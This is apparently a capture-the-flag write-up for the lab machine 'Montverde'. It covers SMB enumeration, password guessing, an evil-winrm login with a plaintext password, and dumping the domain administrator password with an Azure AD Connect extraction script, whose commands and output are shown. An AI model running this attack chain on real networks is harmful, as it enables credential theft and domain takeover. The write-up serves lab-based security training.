# Montverde
## User

Enum4linux gave us some users that we need to try
after a painfull enumeration we can assume that SABatchJobs:SABatchJobs is the user:password we are looking for
we can now connect to the smb shares 
smbmap gave us some more infos 

in the users$ share we can find a xml file who gave us the password of the mhope user 

```
➜  evil-winrm git:(master) ruby evil-winrm.rb -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
```
user.txt is in the Desktop folder

## Root

Exploit Azure AD Connect to get root paper here:
```
https://blog.xpnsec.com/azuread-connect-for-redteam/
```

tool is here:
```
https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
```
the exploit:
```
*Evil-WinRM* PS C:\Users\mhope\Desktop> . .\azure_adconnect.ps1
*Evil-WinRM* PS C:\Users\mhope\Desktop> azure-adconnect -server localhost -db adsync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
```
rooted :D
